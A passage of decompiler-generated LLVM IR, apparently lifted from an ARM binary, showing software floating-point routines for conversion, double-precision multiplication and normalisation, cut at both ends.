  uselistorder i32 %v2_180e4, { 1, 0 }
  uselistorder i1 %v1_180e4, { 1, 0 }
  uselistorder i32 %v0_180dc, { 1, 0 }
  uselistorder i1 %v4_180c8, { 1, 0 }
  uselistorder i32 %v0_1809c, { 2, 0, 1 }
  uselistorder i32 %v0_18098, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_180b4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_18150() local_unnamed_addr {
dec_label_pc_18150:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_18150 = load i32, i32* @r0, align 4
  %v2_18150 = icmp eq i32 %v0_18150, 0
  br i1 %v2_18150, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_18150
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_18150, %bb
  %v0_18158 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_18150, i32 %v0_18158)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_18170 = call i32 @function_17f90()
  store i32 %v0_18170, i32* @r0, align 4
  %v2_18174 = icmp eq i32 %v0_18170, 0
  br i1 %v2_18174, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_1817c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_18174, i32 %v0_1817c)
  store i32 1074, i32* @r4, align 4
  %v1_1818c = and i32 %v0_18170, -2147483648
  store i32 %v1_1818c, i32* @r5, align 4
  %v2_1818c = icmp eq i32 %v1_1818c, 0
  br i1 %v2_1818c, label %bb22, label %bb21

bb21:                                             ; preds = %bb20
  %v2_18190 = sub i32 0, %v0_18170
  store i32 %v2_18190, i32* @r0, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  store i32 0, i32* @r1, align 4
  %v0_18198 = call i32 @function_17f90()
  %v2_1819c = mul i32 %v0_18198, 2
  store i32 %v2_1819c, i32* %r2.global-to-local, align 4
  %v4_1819c = icmp eq i32 %v2_1819c, 0
  %v1_181a0 = and i32 %v2_1819c, 4
  %v2_181a0 = icmp ne i32 %v1_181a0, 0
  %v3_181a0 = sdiv i32 %v2_1819c, 8
  %v3_181a4 = zext i1 %v2_181a0 to i32
  %v6_181a4 = zext i32 %v3_181a0 to i64
  %v7_181a4 = sub nsw i32 33, %v3_181a0
  %v8_181a4 = zext i32 %v7_181a4 to i64
  %v9_181a4 = shl i64 %v6_181a4, %v8_181a4
  %v10_181a4 = sub nsw i32 32, %v3_181a0
  %v11_181a4 = shl i32 %v3_181a4, %v10_181a4
  %v12_181a4 = zext i32 %v11_181a4 to i64
  %v14_181a4 = or i64 %v12_181a4, %v9_181a4
  %v15_181a4 = trunc i64 %v14_181a4 to i32
  store i32 %v15_181a4, i32* %r1.global-to-local, align 4
  %v3_181a8 = mul i32 %v0_18198, 536870912
  store i32 %v3_181a8, i32* @r0, align 4
  br i1 %v4_1819c, label %.thread1, label %bb23

bb23:                                             ; preds = %bb22
  %v2_181ac = and i32 %v2_1819c, -16777216
  store i32 %v2_181ac, i32* @r3, align 4
  %v4_181ac = icmp eq i32 %v2_181ac, 0
  br i1 %v4_181ac, label %.thread1, label %bb24

bb24:                                             ; preds = %bb23
  %v4_181b0 = icmp ugt i32 %v2_1819c, -16777217
  br i1 %v4_181b0, label %.thread1, label %bb25

bb25:                                             ; preds = %bb24
  %v2_181b4 = xor i32 %v15_181a4, 939524096
  store i32 %v2_181b4, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb22, %bb23, %bb24, %bb25
  %v1_181b8 = phi i1 [ false, %bb23 ], [ false, %bb24 ], [ true, %bb25 ], [ false, %bb22 ]
  %v0_181b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_181b8, i32 %v0_181b8)
  %v0_181bc = load i32, i32* %r2.global-to-local, align 4
  %v2_181bc = icmp eq i32 %v0_181bc, 0
  br i1 %v2_181bc, label %dec_label_pc_1820c, label %bb26

bb26:                                             ; preds = %.thread1
  %v1_181c0 = load i32, i32* @r3, align 4
  %v4_181c0 = icmp eq i32 %v1_181c0, -16777216
  br label %dec_label_pc_1820c

dec_label_pc_1820c:                               ; preds = %.thread1, %bb26
  %v1_181c4 = phi i1 [ true, %.thread1 ], [ %v4_181c0, %bb26 ]
  %v0_181c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_181c4, i32 %v0_181c4)
  store i32 896, i32* @r4, align 4
  %v0_181d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_181d0 = and i32 %v0_181d0, -2147483648
  store i32 %v1_181d0, i32* @r5, align 4
  %tmp = bitcast i32 %v0_181d0 to float
  %tmp32 = call float @fabsf(float %tmp)
  %v1_181d4 = bitcast float %tmp32 to i32
  store i32 %v1_181d4, i32* @r1, align 4
  %v0_181d8 = call i32 @function_17f90()
  %v1_181dc = load i32, i32* @r1, align 4
  %v2_181dc = or i32 %v1_181dc, %v0_181d8
  store i32 %v2_181dc, i32* %r2.global-to-local, align 4
  %v4_181dc = icmp eq i32 %v2_181dc, 0
  %v0_181e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_181dc, i32 %v0_181e0)
  store i32 0, i32* @r5, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_18214 = load i32, i32* @r1, align 4
  %tmp33 = icmp ult i32 %v0_18214, 4194304
  call void @__pseudo_cond_branch(i1 %tmp33, i32 ptrtoint (i32* @global_var_17f30.726 to i32))
  %tmp34 = icmp ult i32 %v0_18214, 33554432
  br i1 %tmp34, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_1820c
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1820c, %bb27
  %v1_1822c = phi i32 [ 6, %bb27 ], [ 3, %dec_label_pc_1820c ]
  %tmp35 = icmp ult i32 %v0_18214, 268435456
  br i1 %tmp35, label %bb30, label %bb29

bb29:                                             ; preds = %bb28
  %v2_1822c = add nuw nsw i32 %v1_1822c, 3
  br label %bb30

bb30:                                             ; preds = %bb28, %bb29
  %v0_18230 = phi i32 [ %v2_1822c, %bb29 ], [ %v1_1822c, %bb28 ]
  %not. = icmp slt i32 %v0_18214, 0
  %v4_18230 = zext i1 %not. to i32
  %v5_18230 = add nsw i32 %v0_18230, %v4_18230
  store i32 %v5_18230, i32* %r2.global-to-local, align 4
  %v1_18234 = sub nsw i32 32, %v5_18230
  %v6_18238 = shl i32 %v0_181d8, %v1_18234
  store i32 %v6_18238, i32* @ip, align 4
  %v6_1823c = lshr i32 %v0_181d8, %v5_18230
  %v1_18240 = load i32, i32* @r1, align 4
  %v7_18240 = shl i32 %v1_18240, %v1_18234
  %v8_18240 = or i32 %v7_18240, %v6_1823c
  %v6_18244 = lshr i32 %v1_18240, %v5_18230
  store i32 %v6_18244, i32* %r1.global-to-local, align 4
  %v0_18248 = load i32, i32* %r4.global-to-local, align 4
  %v2_18248 = add i32 %v0_18248, %v5_18230
  store i32 %v2_18248, i32* @r4, align 4
  %v4_1824c = sext i32 %v8_18240 to i64
  %v5_1824c = call i32 @function_17f30(i64 %v4_1824c, i32 %v6_18244, i32 %v5_18230, i32 %v1_18234)
  ret i32 %v5_1824c

; uselistorder directives
  uselistorder i32 %v5_18230, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_181d8, { 1, 2, 0 }
  uselistorder i32 %v3_181a0, { 1, 2, 0 }
  uselistorder i32 %v2_1819c, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 3, { 42, 0, 39, 48, 49, 50, 51, 10, 52, 20, 53, 56, 1, 17, 54, 11, 12, 2, 3, 45, 57, 4, 5, 31, 32, 67, 33, 34, 35, 36, 37, 38, 58, 8, 23, 60, 24, 25, 43, 9, 44, 68, 18, 62, 22, 63, 21, 64, 55, 13, 14, 15, 7, 16, 61, 6, 65, 59, 40, 66, 41, 26, 46, 27, 19, 28, 29, 30, 47 }
  uselistorder i32 6, { 0, 13, 14, 4, 9, 10, 15, 16, 17, 18, 5, 6, 20, 3, 1, 7, 19, 2, 8, 11, 12 }
  uselistorder i32 ()* @function_17f90, { 2, 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_1820c, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_18250(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18250:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18250 = load i32, i32* @r4, align 4
  store i32 %v3_18250, i32* %stack_var_-16, align 4
  %v6_18250 = load i32, i32* @r5, align 4
  %v9_18250 = load i32, i32* @r6, align 4
  %v12_18250 = load i32, i32* @lr, align 4
  store i32 2047, i32* @ip, align 4
  %v4_1825c = udiv i32 %arg2, 1048576
  %v5_1825c = urem i32 %v4_1825c, 2048
  store i32 %v5_1825c, i32* %r4.global-to-local, align 4
  %v6_1825c = icmp eq i32 %v5_1825c, 0
  br i1 %v6_1825c, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_18250
  %v5_18260 = udiv i32 %arg4, 1048576
  %v6_18260 = urem i32 %v5_18260, 2048
  store i32 %v6_18260, i32* @r5, align 4
  %v7_18260 = icmp eq i32 %v6_18260, 0
  br i1 %v7_18260, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_18264 = icmp eq i32 %v5_1825c, 2047
  br i1 %v5_18264, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_18268 = icmp eq i32 %v6_18260, 2047
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18250, %bb, %bb38, %bb39
  %v0_1826c = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_18268, %bb39 ], [ true, %dec_label_pc_18250 ]
  store i32 ptrtoint (i32* @global_var_18270.730 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1826c, i32 ptrtoint (i32* @global_var_18448.728 to i32))
  %v0_18270 = load i32, i32* %r4.global-to-local, align 4
  %v1_18270 = load i32, i32* @r5, align 4
  %v2_18270 = add i32 %v1_18270, %v0_18270
  store i32 %v2_18270, i32* %r4.global-to-local, align 4
  %v2_18274 = xor i32 %arg4, %arg2
  %v1_18278 = load i32, i32* @ip, align 4
  %tmp51 = mul i32 %v1_18278, -2097152
  %v5_18278 = add i32 %tmp51, -1
  %v6_18278 = and i32 %v5_18278, %arg2
  store i32 %v6_18278, i32* %r1.global-to-local, align 4
  %v6_1827c = and i32 %v5_18278, %arg4
  %v5_18280 = mul i32 %arg2, 4096
  %v6_18280 = or i32 %v5_18280, %tmp32
  store i32 %v6_18280, i32* @r5, align 4
  %v8_18280 = icmp eq i32 %v6_18280, 0
  br i1 %v8_18280, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_182885 = or i32 %v6_18278, 1048576
  store i32 %v1_182885, i32* %r1.global-to-local, align 4
  %v1_1828c7 = or i32 %v6_1827c, 1048576
  br label %dec_label_pc_1830c

bb40:                                             ; preds = %.thread2
  %v6_18284 = mul i32 %arg4, 4096
  %v7_18284 = or i32 %v6_18284, %arg3
  store i32 %v7_18284, i32* @r5, align 4
  %v9_18284 = icmp eq i32 %v7_18284, 0
  %v1_18288 = or i32 %v6_18278, 1048576
  store i32 %v1_18288, i32* %r1.global-to-local, align 4
  %v1_1828c = or i32 %v6_1827c, 1048576
  br i1 %v9_18284, label %dec_label_pc_1830c, label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %bb40
  %v6_18294 = mul nuw i64 %tmp, %arg1
  %v7_18294 = udiv i64 %v6_18294, 4294967296
  %v9_18294 = trunc i64 %v6_18294 to i32
  %v7_1829c = zext i32 %v1_18288 to i64
  %v11_1829c = mul nuw nsw i64 %v7_1829c, %tmp
  %v12_1829c = add i64 %v11_1829c, %v7_18294
  %v1_182a0 = and i32 %v2_18274, -2147483648
  %v10_182a4 = zext i32 %v1_1828c to i64
  %v11_182a4 = mul nuw i64 %v10_182a4, %arg1
  %v12_182a4 = add i64 %v12_1829c, %v11_182a4
  %v13_182a4 = udiv i64 %v12_182a4, 4294967296
  %v15_182a4 = trunc i64 %v12_182a4 to i32
  %v10_182ac = mul nuw i64 %v10_182a4, %v7_1829c
  %v11_182ac = add i64 %v13_182a4, %v10_182ac
  %v12_182ac = udiv i64 %v11_182ac, 4294967296
  %v13_182ac = trunc i64 %v12_182ac to i32
  %v14_182ac = trunc i64 %v11_182ac to i32
  %v2_182b0 = icmp eq i32 %v9_18294, 0
  br i1 %v2_182b0, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_18294
  %v2_182b4 = or i32 %v15_182a4, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_18294, %bb41
  %storemerge = phi i32 [ %v2_182b4, %bb41 ], [ %v15_182a4, %dec_label_pc_18294 ]
  %v0_182c8 = phi i32 [ %v2_182b4, %bb41 ], [ %v15_182a4, %dec_label_pc_18294 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_182b8 = add i32 %v2_18270, -255
  %v2_182bc = icmp ugt i32 %v13_182ac, 511
  %v2_182c0 = icmp eq i1 %v2_182bc, false
  %v3_182c0 = add i32 %v2_18270, -1023
  %v5_182c0 = sext i1 %v2_182c0 to i32
  %v6_182c0 = add i32 %v3_182c0, %v5_182c0
  store i32 %v6_182c0, i32* %r4.global-to-local, align 4
  %v3_182c4 = icmp ugt i32 %v1_182b8, 768
  br i1 %v3_182c4, label %dec_label_pc_182d4, label %dec_label_pc_182c8

dec_label_pc_182c8:                               ; preds = %bb42
  %v1_182c8 = icmp slt i32 %v0_182c8, 0
  %v2_182c8 = mul i32 %v0_182c8, 2
  store i32 %v2_182c8, i32* %lr.global-to-local, align 4
  %v3_182cc = mul i32 %v14_182ac, 2
  %v4_182cc = zext i1 %v1_182c8 to i32
  %v5_182cc = or i32 %v4_182cc, %v3_182cc
  %v9_182cc = icmp ule i32 %v5_182cc, %v14_182ac
  %v10_182cc = icmp ult i32 %v3_182cc, %v14_182ac
  %v11_182cc = select i1 %v1_182c8, i1 %v9_182cc, i1 %v10_182cc
  %v3_182d025 = mul nuw nsw i64 %v12_182ac, 2
  %v3_182d0 = trunc i64 %v3_182d025 to i32
  %v4_182d0 = zext i1 %v11_182cc to i32
  %v5_182d0 = or i32 %v4_182d0, %v3_182d0
  br label %dec_label_pc_182d4

dec_label_pc_182d4:                               ; preds = %bb42, %dec_label_pc_182c8
  %v0_182e4 = phi i32 [ %v0_182c8, %bb42 ], [ %v2_182c8, %dec_label_pc_182c8 ]
  %v0_182dc = phi i32 [ %v14_182ac, %bb42 ], [ %v5_182cc, %dec_label_pc_182c8 ]
  %v1_182d4 = phi i32 [ %v13_182ac, %bb42 ], [ %v5_182d0, %dec_label_pc_182c8 ]
  %v4_182d4 = mul i32 %v1_182d4, 2048
  %v4_182d8 = udiv i32 %v0_182dc, 2097152
  %v5_182d4 = or i32 %v4_182d8, %v1_182a0
  %v5_182d8 = or i32 %v5_182d4, %v4_182d4
  store i32 %v5_182d8, i32* %r1.global-to-local, align 4
  %v3_182dc = mul i32 %v0_182dc, 2048
  %v4_182e0 = udiv i32 %v0_182e4, 2097152
  %v5_182e0 = or i32 %v3_182dc, %v4_182e0
  store i32 %v5_182e0, i32* %r0.global-to-local, align 4
  %v3_182e4 = mul i32 %v0_182e4, 2048
  store i32 %v3_182e4, i32* %lr.global-to-local, align 4
  %v1_182e8 = add i32 %v6_182c0, -253
  store i32 %v1_182e8, i32* @ip, align 4
  %v2_182e8 = icmp ugt i32 %v6_182c0, 252
  %v7_182e8 = icmp eq i32 %v6_182c0, 253
  %v2_182ec = xor i1 %v7_182e8, true
  %v3_182ec = and i1 %v2_182e8, %v2_182ec
  br i1 %v3_182ec, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_182d4
  %v6_182ec = icmp ugt i32 %v1_182e8, 1791
  %v11_182ec = icmp eq i32 %v1_182e8, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_182d4, %bb43
  %v1_182f0 = phi i1 [ %v7_182e8, %dec_label_pc_182d4 ], [ %v11_182ec, %bb43 ]
  %v0_182f0 = phi i1 [ %v2_182e8, %dec_label_pc_182d4 ], [ %v6_182ec, %bb43 ]
  %v2_182f0 = xor i1 %v1_182f0, true
  %v3_182f0 = and i1 %v0_182f0, %v2_182f0
  call void @__pseudo_cond_branch(i1 %v3_182f0, i32 ptrtoint (i32* @global_var_1833c.729 to i32))
  %v0_182f4 = load i32, i32* %lr.global-to-local, align 4
  %v2_182f4 = icmp slt i32 %v0_182f4, 0
  %v6_182f4 = icmp eq i32 %v0_182f4, -2147483648
  %v1_182f8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_182f4, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_182f8 = urem i32 %v1_182f8, 2
  %v3_182f8 = icmp ne i32 %v2_182f8, 0
  %v4_182f8 = udiv i32 %v1_182f8, 2
  store i32 %v4_182f8, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_182fc = phi i1 [ %v3_182f8, %bb45 ], [ %v2_182f4, %bb44 ]
  %v2_182fc = zext i1 %v1_182fc to i32
  %v3_182fc = add i32 %v2_182fc, %v1_182f8
  store i32 %v3_182fc, i32* %r0.global-to-local, align 4
  %v0_18300 = load i32, i32* %r1.global-to-local, align 4
  %v1_18300 = load i32, i32* %r4.global-to-local, align 4
  %v2_18300 = and i32 %v1_18300, 4096
  %v3_18300 = icmp ne i32 %v2_18300, 0
  %v4_18300 = mul i32 %v1_18300, 1048576
  %v6_18300 = add i32 %v4_18300, %v0_18300
  %v7_18300 = zext i1 %v3_18300 to i32
  %v8_18300 = add i32 %v7_18300, %v6_18300
  store i32 %v8_18300, i32* %r1.global-to-local, align 4
  %v2_18304 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18304, i32* @r4, align 4
  store i32 %v6_18250, i32* @r5, align 4
  store i32 %v9_18250, i32* @r6, align 4
  store i32 %v12_18250, i32* @lr, align 4
  ret i32 %v3_182fc

dec_label_pc_1830c:                               ; preds = %.thread3, %bb40
  %v1_18318 = phi i32 [ %v1_1828c7, %.thread3 ], [ %v1_1828c, %bb40 ]
  %v1_18310 = phi i32 [ %v1_182885, %.thread3 ], [ %v1_18288, %bb40 ]
  %v1_1830c = and i32 %v2_18274, -2147483648
  store i32 %v1_1830c, i32* @r6, align 4
  %v2_18310 = or i32 %v1_18310, %v1_1830c
  %v4_183141 = or i64 %tmp, %arg1
  %v4_18314 = trunc i64 %v4_183141 to i32
  store i32 %v4_18314, i32* %r0.global-to-local, align 4
  %v2_18318 = xor i32 %v2_18310, %v1_18318
  store i32 %v2_18318, i32* %r1.global-to-local, align 4
  %v4_1831c = udiv i32 %v1_18278, 2
  %v5_1831c = sub i32 %v2_18270, %v4_1831c
  store i32 %v5_1831c, i32* %r4.global-to-local, align 4
  %v7_1831c = sub i32 0, %v5_1831c
  %v8_1831c = and i32 %v2_18270, %v7_1831c
  %v11_1831c = icmp eq i32 %v2_18270, %v4_1831c
  %v7_18320 = icmp sgt i32 %v2_18270, %v4_1831c
  br i1 %v7_18320, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1830c
  %v10_18320 = sub i32 %v1_18278, %v5_1831c
  store i32 %v10_18320, i32* @r5, align 4
  %v12_18320 = xor i32 %v5_1831c, %v1_18278
  %v13_18320 = xor i32 %v10_18320, %v1_18278
  %v14_18320 = and i32 %v13_18320, %v12_18320
  %v17_18320 = icmp eq i32 %v1_18278, %v5_1831c
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1830c, %bb46
  %v3_1832c.in = phi i32 [ %v8_1831c, %dec_label_pc_1830c ], [ %v14_18320, %bb46 ]
  %v2_1832c.in = phi i32 [ %v5_1831c, %dec_label_pc_1830c ], [ %v10_18320, %bb46 ]
  %v1_1832c = phi i1 [ %v11_1831c, %dec_label_pc_1830c ], [ %v17_18320, %bb46 ]
  %v2_1832c = icmp slt i32 %v2_1832c.in, 0
  %v3_1832c = icmp slt i32 %v3_1832c.in, 0
  %v3_18324 = xor i1 %v3_1832c, %v2_1832c
  %v4_18324 = or i1 %v1_1832c, %v3_18324
  br i1 %v4_18324, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1832c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1832430 = mul i32 %v5_1831c, 1048576
  %v10_1832431 = or i32 %v2_18318, %v9_1832430
  store i32 %v10_1832431, i32* %r1.global-to-local, align 4
  %v7_18328 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_18328, i32* %r4.global-to-local, align 4
  store i32 %v6_18250, i32* @r5, align 4
  store i32 %v9_18250, i32* @r6, align 4
  store i32 %v12_18250, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1832c = phi i32 [ %v0_1832c.pre, %._crit_edge23 ], [ %v12_18250, %bb48 ]
  %v6_1832c = xor i1 %v4_18324, true
  call void @__pseudo_cond_branch(i1 %v6_1832c, i32 %v0_1832c)
  %v0_18330 = load i32, i32* %r1.global-to-local, align 4
  %v1_18330 = or i32 %v0_18330, 1048576
  store i32 %v1_18330, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v0_18338 = load i32, i32* %r4.global-to-local, align 4
  %v1_18338 = add i32 %v0_18338, -1
  store i32 %v1_18338, i32* @r4, align 4
  ret i32 %v4_18314

; uselistorder directives
  uselistorder i32 %v5_1831c, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1831c, { 2, 1, 0 }
  uselistorder i32 %v1_182f8, { 2, 0, 1 }
  uselistorder i32 %v0_182f4, { 1, 0 }
  uselistorder i1 %v7_182e8, { 1, 0 }
  uselistorder i32 %v2_182c8, { 1, 0 }
  uselistorder i1 %v1_182c8, { 1, 0 }
  uselistorder i32 %v6_182c0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_182c8, { 1, 0, 2 }
  uselistorder i32 %v14_182ac, { 1, 3, 2, 0 }
  uselistorder i64 %v11_182ac, { 1, 0 }
  uselistorder i64 %v12_182a4, { 1, 0 }
  uselistorder i64 %v10_182a4, { 1, 0 }
  uselistorder i64 %v7_1829c, { 1, 0 }
  uselistorder i64 %v6_18294, { 1, 0 }
  uselistorder i32 %v6_1827c, { 1, 0 }
  uselistorder i32 %v6_18278, { 1, 0, 2 }
  uselistorder i32 %v1_18278, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_18270, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_18260, { 2, 1, 0 }
  uselistorder i32 %v5_1825c, { 2, 1, 0 }
  uselistorder i32 %v12_18250, { 0, 2, 1 }
  uselistorder i32 %v9_18250, { 1, 0 }
  uselistorder i32 %v6_18250, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 10, 2, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 6, 2, 3, 4, 5, 0, 7 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1830c, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_182d4, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1833c() local_unnamed_addr {
dec_label_pc_1833c:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1833c = load i1, i1* @cpsr_z, align 1
  %v1_1833c = load i1, i1* @cpsr_n, align 1
  %v2_1833c = load i1, i1* @cpsr_v, align 1
  %v3_1833c = xor i1 %v1_1833c, %v2_1833c
  %v4_1833c = or i1 %v0_1833c, %v3_1833c
  br i1 %v4_1833c, label %dec_label_pc_18340, label %dec_label_pc_184b8

dec_label_pc_18340:                               ; preds = %dec_label_pc_1833c
  %v0_18340 = load i32, i32* @r4, align 4
  %v4_18340 = add i32 %v0_18340, 54
  %v6_18340 = sub i32 0, %v0_18340
  %v7_18340 = and i32 %v4_18340, %v6_18340
  %v8_18340 = icmp slt i32 %v7_18340, 0
  %v9_18340 = icmp slt i32 %v4_18340, 0
  %v10_18340 = icmp eq i32 %v4_18340, 0
  %v7_18344 = icmp sgt i32 %v0_18340, -54
  br i1 %v7_18344, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_18340
  store i32 0, i32* @r0, align 4
  %v8_18348 = load i32, i32* @r1, align 4
  %v9_18348 = and i32 %v8_18348, -2147483648
  store i32 %v9_18348, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18340, %bb
  %v4_18350 = xor i1 %v9_18340, %v8_18340
  %v5_18350 = or i1 %v10_18340, %v4_18350
  call void @__pseudo_cond_branch(i1 %v5_18350, i32 %tmp7)
  %v0_18354 = load i32, i32* @r4, align 4
  %v1_18354 = sub i32 0, %v0_18354
  %v2_18358 = sub i32 -32, %v0_18354
  %v4_18358 = add i32 %v0_18354, 31
  %v5_18358 = and i32 %v4_18358, %v1_18354
  %v6_18358 = icmp slt i32 %v5_18358, 0
  store i1 %v6_18358, i1* @cpsr_v, align 1
  %v6_1835c = icmp slt i32 %v1_18354, 32
  br i1 %v6_1835c, label %dec_label_pc_18360, label %dec_label_pc_183cc

dec_label_pc_18360:                               ; preds = %.thread1
  %v1_18360 = add i32 %v2_18358, 12
  %v8_18364 = icmp sgt i32 %v1_18360, 0
  br i1 %v8_18364, label %dec_label_pc_1839c, label %dec_label_pc_18368

dec_label_pc_18368:                               ; preds = %dec_label_pc_18360
  %v1_18368 = add i32 %v2_18358, 32
  %v1_1836c = sub i32 0, %v2_18358
  %v0_18370 = load i32, i32* @r0, align 4
  %v6_18370 = shl i32 %v0_18370, %v1_1836c
  store i32 %v6_18370, i32* @r3, align 4
  %v2_18374 = add i32 %v2_18358, 31
  %v3_18374 = shl i32 1, %v2_18374
  %v6_18374 = lshr i32 %v0_18370, %v1_18368
  %v1_18378 = load i32, i32* @r1, align 4
  %v7_18378 = shl i32 %v1_18378, %v1_1836c
  %v8_18378 = or i32 %v7_18378, %v6_18374
  %v1_1837c = and i32 %v1_18378, -2147483648
  store i32 %v1_1837c, i32* @r2, align 4
  %tmp = bitcast i32 %v1_18378 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_18380 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_18370, 0
  %v4_18384 = zext i1 %tmp20 to i32
  %v5_18384 = add i32 %v8_18378, %v4_18384
  %v5_18388 = and i32 %v1_18380, %v3_18374
  %v6_18388 = icmp ne i32 %v5_18388, 0
  %v7_18388 = lshr i32 %v1_18380, %v1_18368
  %v9_18388 = add i32 %v7_18388, %v1_1837c
  %v10_18388 = zext i1 %v6_18388 to i32
  %v11_18388 = add i32 %v9_18388, %v10_18388
  store i32 %v11_18388, i32* @r1, align 4
  %v19_18388 = add i32 %v11_18388, %v10_18388
  %v20_18388 = xor i32 %v19_18388, %v1_18378
  %v21_18388 = xor i32 %v19_18388, %v7_18388
  %v22_18388 = and i32 %v20_18388, %v21_18388
  %v23_18388 = icmp slt i32 %v22_18388, 0
  store i1 %v23_18388, i1* @cpsr_v, align 1
  %v3_1838c = mul i32 %v6_18370, 2
  %v4_1838c = or i32 %v3_1838c, %tmp7
  %v5_1838c = icmp slt i32 %v4_1838c, 0
  store i1 %v5_1838c, i1* @cpsr_n, align 1
  %v6_1838c = icmp eq i32 %v4_1838c, 0
  store i1 %v6_1838c, i1* @cpsr_z, align 1
  br i1 %v6_1838c, label %bb13, label %bb14

